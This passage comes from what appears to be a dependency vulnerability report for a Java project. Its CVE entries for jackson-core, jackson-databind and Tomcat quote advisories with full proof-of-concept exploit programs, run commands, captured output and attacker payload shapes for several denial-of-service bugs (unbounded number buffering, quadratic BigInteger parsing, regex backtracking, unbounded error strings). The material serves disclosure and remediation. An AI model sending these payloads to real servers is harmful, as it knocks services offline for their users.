            System.out.println("[+] sync parser rejected 5000-digit int: " + e.getClass().getSimpleName());
        }

        // Bug: async parser, chunked, no terminator.
        JsonParser ap = f.createNonBlockingByteArrayParser();
        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;

        byte[] preamble = "{\"v\":".getBytes("UTF-8");
        feeder.feedInput(preamble, 0, preamble.length);
        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }

        byte[] digits = new byte[16 * 1024];
        for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));

        for (int c = 0; c < 600; c++) {
            feeder.feedInput(digits, 0, digits.length);
            JsonToken t = ap.nextToken();
            if (t != JsonToken.NOT_AVAILABLE) {
                System.out.println("[-] unexpected token: " + t);
                return;
            }
        }
        System.out.println("[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000");

        // Closing the number now finally triggers the validator.
        feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
        feeder.endOfInput();
        try {
            while (ap.nextToken() != null) { /* drive */ }
        } catch (Exception e) {
            System.out.println("[*] late rejection on close: " + e.getMessage().split("\n")[0]);
        }
        ap.close();
    }
}
EOF
javac -cp jackson-core-2.18.6.jar PoC.java
java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
```

Observed output against `jackson-core-2.18.6`:

```
[+] sync parser rejected 5000-digit int: StreamConstraintsException
[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000
[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)
```

Observed output against `jackson-core-2.21.1`: identical.

The 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.

## End-to-end reproduction through real HTTP

Supplements the standalone PoC with a running Spring Boot WebFlux server,
driving the same bug through the actual reactor-netty + Jackson2JsonDecoder
streaming-decode path that production reactive endpoints use.

Setup:
- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)
- jackson-databind 2.17.2, jackson-core overridden:
  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)
  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
- JVM: OpenJDK 17.0.18
- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`

Endpoint under test exposes the `Flux<DataBuffer>` request body directly to
`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one
HTTP chunk per `feedInput` (the same pattern used for any
`@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket
HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of 200 digit bytes
each (50,000 digits total) at 20ms intervals, then writes the closing `}`.

VULN — jackson-core 2.18.7:
```
[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting
[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
HTTP/1.1 200 OK
ERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:
       Number value length (50000) exceeds the maximum allowed (1000, ...)
```
Server-side controller trace (250 DataBuffer arrivals elided):
```
[ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
[ctrl] DataBuffer arrived size=200 ms=42
...
[ctrl] DataBuffer arrived size=199 ms=5993
[ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'
[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...
```
Server held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with
`maxNumberLength=1000` declared. The validator never fires during streaming;
it only fires at value-completion when the closing `}` arrives.

PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
```
[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe
[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream
```
Server-side controller trace:
```
[ctrl] DataBuffer arrived size=6   ms=129
[ctrl] DataBuffer arrived size=200 ms=142
[ctrl] DataBuffer arrived size=200 ms=142
[ctrl] DataBuffer arrived size=200 ms=145
[ctrl] DataBuffer arrived size=200 ms=146
[ctrl] DataBuffer arrived size=200 ms=147
[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)
```
Patched server raises `StreamConstraintsException` at 155ms after only 5
DataBuffers, exactly when the accumulated digit count crosses
`maxNumberLength=1000`. The connection is reset mid-stream rather than the
parser silently consuming the rest of the attacker's payload.

Side-by-side:

| Build | Chunks accepted before exception | Digits buffered | Time to detection |
|---|---|---|---|
| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |
| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |

Note on the default `@RequestBody Mono<JsonNode>` path: that path cannot
distinguish the two builds because Spring's `decodeToMono` joins all
DataBuffers into one before parsing. The exploitable shape is the
streaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /
WebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),
which is also what `Jackson2Tokenizer` uses for any streaming JSON
deserialization in WebFlux and Quarkus reactive REST.

## Suggested fix

Mirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:

```diff
     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
         int negMod = _numberNegative ? -1 : 0;

         while (true) {
             if (_inputPtr >= _inputEnd) {
                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                 _textBuffer.setCurrentLength(outPtr);
+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);
                 return _updateTokenToNA();
             }
```

Note: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.

Apply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).

Alternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.

## Credit

Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.

Recommended fix:
- com.fasterxml.jackson.core:jackson-core: upgrade to 2.21.4 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-68497: jackson-databind: Duration XMLGregorianCalendar Unbounded Number Parse DoS
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-68497](https://github.com/advisories/GHSA-q4xh-88c3-wmh7): jackson-databind: Duration XMLGregorianCalendar Unbounded Number Parse DoS

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-databind:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, < 2.21.6

Advisory description / exploitation conditions:
### Summary
`jackson-databind` 3.2.1 deserializes a JSON **string** bound to a `javax.xml.datatype.Duration` or `javax.xml.datatype.XMLGregorianCalendar` field by passing the raw string verbatim to `DatatypeFactory.newDuration(value)` / `newXMLGregorianCalendar(value)`. Per the XML-Schema lexical grammar these factory methods accept numeric components of arbitrary length, which the JDK materializes into `java.math.BigInteger` / `BigDecimal` using the native `BigInteger(String)` constructor (an O(n²) parser). Because the digits reside inside a JSON **string** token, jackson-core's `StreamReadConstraints.maxNumberLength` guard (which bounds only JSON *number* tokens) never fires, so there is no length limit anywhere on this path. An unauthenticated attacker can submit a single small request (e.g. ~1–5 MB) that forces tens of seconds to minutes of single-thread CPU consumption, yielding a denial of service under the default `JsonMapper.builder().build()` mapper with no polymorphic typing or special configuration.

### Details
`StreamReadConstraints.maxNumberLength` (jackson-core, default 1000) bounds the **text length of JSON number tokens** only; it does not apply to digits inside a JSON string token (`maxStringLength` default is 100,000,000). jackson's own value binders compensate for this gap elsewhere — `NumberDeserializers` explicitly call `streamReadConstraints().validateIntegerLength(text.length())` / `validateFPLength(text.length())` before parsing a *stringified* number (`NumberDeserializers.java:1063`, `:1139`). The XML-datatype deserializer omits this identical pre-check.

`CoreXMLDeserializers` registers `Std` deserializers **by default** for any field typed `javax.xml.datatype.Duration` or `XMLGregorianCalendar` (`findBeanDeserializer`), with no opt-in required. `Std._deserialize` hands the attacker string straight to the datatype factory:

```java
protected Object _deserialize(String value, DeserializationContext ctxt) {
    switch (_kind) {
    case TYPE_DURATION:
        return _dataTypeFactory.newDuration(value);                 // attacker lexical string
    case TYPE_G_CALENDAR:
        Date d;
        try { d = _parseDate(value, ctxt); }
        catch (DatabindException e) {
            return _dataTypeFactory.newXMLGregorianCalendar(value); // attacker lexical string
        }
        return _gregorianFromDate(ctxt, d);
    }
    throw new IllegalStateException();
}
```

Per the XSD lexical rules, `newDuration` parses each numeric component (years, months, …) into a `BigInteger`, and `newXMLGregorianCalendar` parses fractional seconds into a `BigDecimal`. The JDK uses the native `BigInteger(String)` / `BigDecimal(String)` constructors, which are O(n²) in the digit count. A short JSON string such as `"P" + "9"×N + "Y"` therefore forces the allocation and O(N²) parse of an N-digit `BigInteger`, entirely downstream of every jackson-core constraint.

## Vulnerable Code Location

- `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:137`
  — `newDuration(value)` (TYPE_DURATION)
- `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:147`
  — `newXMLGregorianCalendar(value)` (TYPE_G_CALENDAR fallback)
- Registration (default, no opt-in):
  `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:42-46`
  (`findBeanDeserializer` returns `Std` for `XMLGregorianCalendar` / `Duration`)
- Contrast — correct length-guard pattern already used elsewhere in the library:
  `src/main/java/tools/jackson/databind/deser/jdk/NumberDeserializers.java:1063,1139`

## Proof of Concept

PoC source (`Vuln07_DurationDoS.java`). It uses only the public `ObjectMapper.readValue` API and a default mapper; the only "special" element is a normal DTO exposing a `javax.xml.datatype.Duration` field.

```java
package com.poc;

import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.json.JsonMapper;
import javax.xml.datatype.Duration;

/**
 * Vuln 7: Unbounded numeric allocation / CPU DoS via Duration lexical deserialization.
 * A short JSON string forces parsing of a huge BigInteger inside DatatypeFactory.newDuration.
 */
public class Vuln07_DurationDoS {
    public static class Cfg { public Duration ttl; }

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = JsonMapper.builder().build();
        int digits = Integer.getInteger("digits", 5_000_000);

        // Baseline small parse.
        long t0 = System.nanoTime();
        mapper.readValue("{\"ttl\":\"P1Y\"}", Cfg.class);
        long tBase = System.nanoTime() - t0;
        System.out.println("Baseline (P1Y) parse: " + (tBase/1_000_000) + " ms");

        String big = "P" + "9".repeat(digits) + "Y";
        String json = "{\"ttl\":\"" + big + "\"}";
        System.out.println("Payload JSON size ~ " + json.length() + " bytes (year component = " + digits + " digits)");
        long t1 = System.nanoTime();
        try {
            Cfg c = mapper.readValue(json, Cfg.class);
            long dt = System.nanoTime() - t1;
            System.out.println("Parsed giant Duration in " + (dt/1_000_000) + " ms; years field type materialized as BigInteger");
            System.out.println("RESULT: VULNERABLE - " + digits + "-digit BigInteger parsed from a "
                    + json.length() + "-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)");
        } catch (Throwable t) {
            long dt = System.nanoTime() - t1;
            System.out.println("After " + (dt/1_000_000) + " ms threw " + t.getClass().getName() + ": " + t.getMessage());
        }
    }
}
```

Minimal HTTP-shaped payload (what an attacker sends):

```json
{ "ttl": "P99999999999999999999…9Y" }   // 'P' + N nines + 'Y', N up to ~100,000,000
```

An `XMLGregorianCalendar` field is equally affected via the fractional-seconds path, e.g.
`{ "at": "0000-01-01T00:00:00." + "9"×N }`.

## Execution Steps

The PoC needs only the three Jackson 3.2.1 jars on the classpath; it can be built and run with plain `javac`/`java` (no Maven required). The jars are the standard published artifacts (here resolved from the local Maven cache `~/.m2`, but any copy works).

```bash
# 0. Locate the three dependency jars (published Maven artifacts).
M2="$HOME/.m2/repository"
DB="$M2/tools/jackson/core/jackson-databind/3.2.1/jackson-databind-3.2.1.jar"
CORE="$M2/tools/jackson/core/jackson-core/3.2.1/jackson-core-3.2.1.jar"
ANN="$M2/com/fasterxml/jackson/core/jackson-annotations/2.22/jackson-annotations-2.22.jar"
CP="$DB:$CORE:$ANN"
#   If not already cached, fetch them once, e.g.:
#   mvn -q dependency:get -Dartifact=tools.jackson.core:jackson-databind:3.2.1
#   (jackson-core 3.2.1 and jackson-annotations 2.22 come as transitive deps)

# 1. Compile with javac (single source file).
mkdir -p out
javac -cp "$CP" -d out src/main/java/com/poc/Vuln07_DurationDoS.java

# 2. Quick confirmation (~11 s): 1,000,000-digit year component.
java -Xmx2g -Ddigits=1000000 -cp "out:$CP" com.poc.Vuln07_DurationDoS

# 3. Full-severity demonstration (~293 s): 5,000,000-digit year component.
java -Xmx2g -Ddigits=5000000 -cp "out:$CP" com.poc.Vuln07_DurationDoS
```

The `digits` system property controls the number of `9` characters in the year component; JSON payload size ≈ digits + 12 bytes. Increase toward the default 100,000,000 `maxStringLength` to scale cost further.

Environment used for the evidence below: jackson-databind 3.2.1, jackson-core 3.2.1, jackson-annotations 2.22; OpenJDK 25 on macOS (darwin), default `JsonMapper.builder().build()`.

## Reproduction Evidence

Deterministic values (payload byte count, resulting bit-length) are exact across runs; timings vary with load. Two independent runs at different sizes:

**digits = 5,000,000 (~5 MB payload):**
```
Baseline (P1Y) parse: 27 ms
Payload JSON size ~ 5000012 bytes (year component = 5000000 digits)
Parsed giant Duration in 293175 ms; years field type materialized as BigInteger
RESULT: VULNERABLE - 5000000-digit BigInteger parsed from a 5000012-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)
```

**digits = 1,000,000 (~1 MB payload, for fast repeatability):**
```
Baseline (P1Y) parse: 53 ms
Payload JSON size ~ 1000012 bytes (year component = 1000000 digits)
Parsed giant Duration in 11155 ms; years field type materialized as BigInteger
RESULT: VULNERABLE - 1000000-digit BigInteger parsed from a 1000012-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)
```

Interpretation: a normal `"P1Y"` value parses in tens of milliseconds; a ~1 MB attacker payload consumes **~11 s** and a ~5 MB payload **~293 s** of single-thread CPU — a 5–6 order-of-magnitude amplification. The super-linear growth (≈26× cost for 5× payload) is consistent with the JDK's O(n²) `BigInteger(String)` constructor. The cost occurs inside `DatatypeFactory.newDuration`, downstream of jackson-core's `StreamReadConstraints` (independently confirmed: the same digit sequence supplied as a bare JSON *number* token is rejected with `StreamConstraintsException`, whereas inside a string token it is not bounded).

## Impact

An unauthenticated attacker can stall a request-processing thread for tens of seconds to minutes and allocate a large `BigInteger`/`BigDecimal` from a single small request. Because the cost is CPU-bound and super-linear, a handful of concurrent requests can saturate the server's worker threads and CPU, denying service to all users. The exposure requires only that a bound type expose a `javax.xml.datatype.Duration` or `XMLGregorianCalendar` field  common in applications that ingest XML-schema derived data, SOAP/JAXB-adjacent models, or configuration carrying XSD durations — and fires under the default mapper with no polymorphic typing.

## Recommended Fix

Apply the same validate-length-then-parse idiom the core `NumberDeserializers` already use:

1. In `CoreXMLDeserializers.Std._deserialize`, enforce a maximum raw-string length before
   calling `newDuration(value)` / `newXMLGregorianCalendar(value)` — e.g. reject inputs
   longer than `ctxt.streamReadConstraints().getMaxNumberLength()` (or a dedicated bound),
   routing over-length input through `ctxt.handleWeirdStringValue(...)`.
2. Alternatively, validate the lexical form against a bounded regex and cap the digit count
   of each numeric component before delegating to `DatatypeFactory`.
3. Document that `Duration` / `XMLGregorianCalendar` fields bound from untrusted input must
   be length-limited at the transport layer.

Recommended fix:
- com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.6 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-68525: Apache Tomcat's FORM authentication process has an Incorrect Authorization vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-68525](https://github.com/advisories/GHSA-h3x4-894j-xpx5): Apache Tomcat's FORM authentication process has an Incorrect Authorization vulnerability

Severity: CRITICAL

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.58

Advisory description / exploitation conditions:
Incorrect Authorization vulnerability in Apache Tomcat's FORM authentication process allows the bypassing of a security constraint that limits user has access to a resource POST but not GET.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120.

The following versions were EOL at the time the CVE was created but are known to be affected: from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109. Other unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.25, 10.1.58 or 9.0.121, which fixes the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.58 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-89407:  jackson-core: ReDoS: quadratic backtracking in NumberInput.PATTERN_FLOAT via looksLikeValidNumber()
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-89407](https://github.com/advisories/GHSA-p6pp-m3f8-5c89):  jackson-core: ReDoS: quadratic backtracking in NumberInput.PATTERN_FLOAT via looksLikeValidNumber()

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-core:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, <= 2.21.6

Advisory description / exploitation conditions:
## Status

**FULLY REPRODUCED** with a clean, textbook empirical signature: measured runtime grew almost
exactly 4x for every doubling of input size across five consecutive doublings (5,000 → 160,000
characters), confirming O(n²) behavior. A single 160,000-character string (smaller than a typical
HTTP request body) took **74.4 seconds** for one call to `NumberInput.looksLikeValidNumber()`.

## Affected Component / Version

- **Package:** `com.fasterxml.jackson.core:jackson-core`
- **Confirmed against:** `jackson-core-2.20.2`
- **Affected file:** `src/main/java/com/fasterxml/jackson/core/io/NumberInput.java`
  (`PATTERN_FLOAT` line ~41-42, `PATTERN_FLOAT_TRAILING_DOT` line ~51, entry point
  `looksLikeValidNumber()` lines ~646-656)

## Technical Analysis

```java
private final static Pattern PATTERN_FLOAT = Pattern.compile(
      "[+-]?[0-9]*[\\.]?[0-9]+([eE][+-]?[0-9]+)?");

private final static Pattern PATTERN_FLOAT_TRAILING_DOT = Pattern.compile(
        "[+-]?[0-9]+[\\.]");

public static boolean looksLikeValidNumber(final String s) {
    // ... short-circuits only for null/empty/length==1 ...
    return PATTERN_FLOAT.matcher(s).matches()
            || PATTERN_FLOAT_TRAILING_DOT.matcher(s).matches();
}
```

`PATTERN_FLOAT` contains ambiguous, adjacent quantifiers over the identical character class:
`[0-9]*` (optional digits), an optional `[.]`, then `[0-9]+` (required digits). Java's
backtracking `Pattern`/`Matcher` engine has no possessive quantifiers or atomic grouping here,
so on a non-matching input the engine must explore every possible split point between the
`[0-9]*` and `[0-9]+` groups before concluding failure — the classic quadratic-backtracking
shape. `looksLikeValidNumber()` compounds the cost by running a **second** full-string regex
(`PATTERN_FLOAT_TRAILING_DOT`) whenever the first fails, roughly doubling the constant factor
without changing the asymptotic class.

Critically, the length gate that applies to this specific path is
`StreamReadConstraints.maxStringLength` (default **20,000,000**), not `maxNumberLength`
(default **1,000**) — the length ceiling the library uses everywhere else for numeric content.
This means inputs up to four orders of magnitude larger than the library's own numeric-length
policy reach this quadratic regex unmodified.

## Reproduction Procedure

Same clone/build steps as `jackson-core_1_...md`. Then:

```bash
CP="build/classes:build/lib/fastdoubleparser-2.0.1.jar"
javac -cp "$CP" -d poc poc/PoC8_NumberInputReDoS.java
java -cp "poc:$CP" PoC8_NumberInputReDoS
```

## Full PoC Source (`poc/PoC8_NumberInputReDoS.java`)

```java
import com.fasterxml.jackson.core.io.NumberInput;

public class PoC8_NumberInputReDoS {

    public static void main(String[] args) {
        int[] sizes = {5_000, 10_000, 20_000, 40_000, 80_000, 160_000};
        long[] timesMs = new long[sizes.length];

        System.out.println("Timing NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:\n");

        for (int i = 0; i < sizes.length; i++) {
            int n = sizes[i];
            String s = repeat('1', n) + "x";

            if (i == 0) {
                NumberInput.looksLikeValidNumber(repeat('1', 200) + "x"); // warm up
            }

            long t0 = System.nanoTime();
            boolean result = NumberInput.looksLikeValidNumber(s);
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            timesMs[i] = elapsedMs;

            System.out.printf("n=%-8d looksLikeValidNumber=%-6b elapsed=%6d ms%n", n, result, elapsedMs);
        }

        System.out.println("\nRatio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):");
        boolean quadraticSignatureObserved = false;
        for (int i = 1; i < sizes.length; i++) {
            double ratio = timesMs[i - 1] == 0 ? Double.NaN : (double) timesMs[i] / (double) timesMs[i - 1];
            System.out.printf("  n=%d -> n=%d : %dms -> %dms  (ratio=%.2fx)%n",
                    sizes[i - 1], sizes[i], timesMs[i - 1], timesMs[i], ratio);
            if (ratio >= 3.0) quadraticSignatureObserved = true;
        }

        System.out.println("\nLargest test (n=" + sizes[sizes.length - 1] + ") took " + timesMs[timesMs.length - 1]
                + " ms for a single call from ONE HTTP-body-sized string.");
        System.out.println("\ncom.fasterxml.jackson.core.StreamReadConstraints.DEFAULT_MAX_STRING_LENGTH (20,000,000) "
                + "governs this path, not maxNumberLength (1,000).");

        if (quadraticSignatureObserved) {
            System.out.println("\n=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent "
                    + "with quadratic backtracking in PATTERN_FLOAT on non-matching input.");
        }
    }

    static String repeat(char c, int n) {
        char[] arr = new char[n];
        java.util.Arrays.fill(arr, c);
        return new String(arr);
    }
}
```

## Captured Evidence (actual run output)

```
Timing NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:

n=5000     looksLikeValidNumber=false  elapsed=    74 ms
n=10000    looksLikeValidNumber=false  elapsed=   306 ms
n=20000    looksLikeValidNumber=false  elapsed=  1157 ms
n=40000    looksLikeValidNumber=false  elapsed=  4655 ms
n=80000    looksLikeValidNumber=false  elapsed= 18592 ms
n=160000   looksLikeValidNumber=false  elapsed= 74393 ms

Ratio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):
  n=5000 -> n=10000 : 74ms -> 306ms  (ratio=4.14x)
  n=10000 -> n=20000 : 306ms -> 1157ms  (ratio=3.78x)
  n=20000 -> n=40000 : 1157ms -> 4655ms  (ratio=4.02x)
  n=40000 -> n=80000 : 4655ms -> 18592ms  (ratio=3.99x)
  n=80000 -> n=160000 : 18592ms -> 74393ms  (ratio=4.00x)

Largest test (n=160000) took 74393 ms for a single call from ONE HTTP-body-sized string.

=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent with quadratic
backtracking in PATTERN_FLOAT on non-matching input.
```

This is an unusually clean empirical result: five consecutive doublings each produced a ratio
between 3.78x and 4.14x — matching the theoretical O(n²) prediction (ratio = 4.0x) to within
5% at every single measurement, leaving essentially no ambiguity about the complexity class.
Extrapolating this measured curve, a ~1MB string (well within common request body limits) would
take on the order of hours for a single call.

## Impact

Any application that coerces a String-typed JSON field to a number (default `jackson-databind`
behavior) is exposed: an attacker who can submit a large numeric-looking string (up to
`maxStringLength`'s default of 20,000,000 characters — far larger than needed given the
measured curve) can pin a request-handling thread for an extended period with a single request.
Because the cost scales quadratically, a handful of concurrent moderately-sized requests
(tens to low hundreds of KB each) is sufficient to exhaust a typical web server's worker thread
pool, denying service to all users.

## Remediation

1. Rewrite `PATTERN_FLOAT` without quantifier ambiguity using possessive quantifiers, e.g.
   `[+-]?(?:[0-9]++(?:\.[0-9]*+)?|\.[0-9]++)(?:[eE][+-]?[0-9]++)?`, which also folds in the
   trailing-dot case and removes the need for a second full-string scan.
2. Better: replace the regex entirely with a single-pass hand-written character scan — the same
   file already contains exactly this pattern for `parseInt`, so the library has both the
   precedent and the code style available.
3. Apply an independent length limit (`maxNumberLength`, not the much larger
   `maxStringLength`) before calling `looksLikeValidNumber()`, closing the four-orders-of-
   magnitude gap between the two constraints for this specific code path.
4. Operationally, until fixed: tighten `StreamReadConstraints.maxStringLength` well below its
   default, and set wall-clock timeouts on parse/coercion operations.

Recommended fix:
- com.fasterxml.jackson.core:jackson-core: upgrade to 2.21.7 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-89425: jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-89425](https://github.com/advisories/GHSA-7hhh-6rmp-j9qf): jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-core:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, <= 2.21.6

Advisory description / exploitation conditions:
## Status

**FULLY REPRODUCED.** A malformed token fed through `createParser(DataInput)` produced a
20,000,109-character exception message from a 20-million-character attacker payload, while the
identical payload fed through `createParser(InputStream)` produced a correctly bounded
367-character message.

## Affected Component / Version

- **Package:** `com.fasterxml.jackson.core:jackson-core`
- **Confirmed against:** `jackson-core-2.20.2`
- **Affected file:** `src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java`
  (`_reportInvalidToken(int, String, String)`, lines ~2763-2780 in the 2.20.2 tree)

## Technical Analysis

`UTF8DataInputJsonParser._reportInvalidToken()` builds the offending-token description for its
exception message by appending identifier characters one at a time to a bare `StringBuilder`:

```java
protected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {
    StringBuilder sb = new StringBuilder(matchedPart);
    while (true) {
        char c = (char) _decodeCharForError(ch);
        if (!Character.isJavaIdentifierPart(c)) {
            break;
        }
        sb.append(c);
        ch = _inputData.readUnsignedByte();
    }
    _reportError("Unrecognized token '"+sb.toString()+"': was expecting "+msg);
}
```

There is **no check against `ErrorReportConfiguration.getMaxErrorTokenLength()`** (default 256)
anywhere in this loop. By contrast, the sibling `UTF8StreamJsonParser` implementation of the
same logic does enforce it:

```java
// UTF8StreamJsonParser.java (control, correctly bounded)
if (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {
    sb.append("...");
    break;
}
```

`ReaderBasedJsonParser` and `NonBlockingUtf8JsonParserBase` also correctly enforce the limit —
this is a defect isolated to the `DataInput`-backed implementation specifically, confirmed by
direct comparison of all four parser implementations in this tree.

This path is additionally left with **no fallback control**: because of `[core#1570]`-related
logic in `JsonFactory`, configuring `maxDocumentLength` causes `DataInput`-sourced parser
creation to be rejected outright, so a document-length backstop cannot coexist with this input
source, and the identifier-character accumulation never passes through
`ReadConstrainedTextBuffer`, so `maxStringLength` does not apply either. There is no
configuration an application can set to mitigate this specific path.

## Reproduction Procedure

Same clone/build steps as `jackson-core_1_...md`. Then:

```bash
CP="build/classes:build/lib/fastdoubleparser-2.0.1.jar"
javac -cp "$CP" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java
java -Xmx2g -cp "poc:$CP" PoC6_UnboundedErrorTokenStringBuilder
```

## Full PoC Source (`poc/PoC6_UnboundedErrorTokenStringBuilder.java`)

```java
import com.fasterxml.jackson.core.*;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;

public class PoC6_UnboundedErrorTokenStringBuilder {

    static class RepeatingByteInputStream extends InputStream {
        private final int b;
        private long remaining;
        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }
        @Override public int read() {
            if (remaining <= 0) return -1;
            remaining--;
            return b;
        }
    }

    public static void main(String[] args) throws Exception {
        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;

        System.out.println("Malformed token: \"t\" followed by " + IDENTIFIER_CHAR_COUNT
                + " Java-identifier characters ('x'), then a terminating space, never completing"
                + " \"true\"/\"false\"/\"null\"/NaN.\n");

        System.out.println("=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===");
        {
            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
            DataInputStream dataIn = new DataInputStream(raw);
            JsonFactory factory = new JsonFactory();
            JsonParser p = factory.createParser((java.io.DataInput) dataIn);

            long heapBefore = usedHeap();
            long t0 = System.nanoTime();
            String message = null;
            try {
                p.nextToken(); p.nextToken(); p.nextToken();
            } catch (JsonParseException e) {
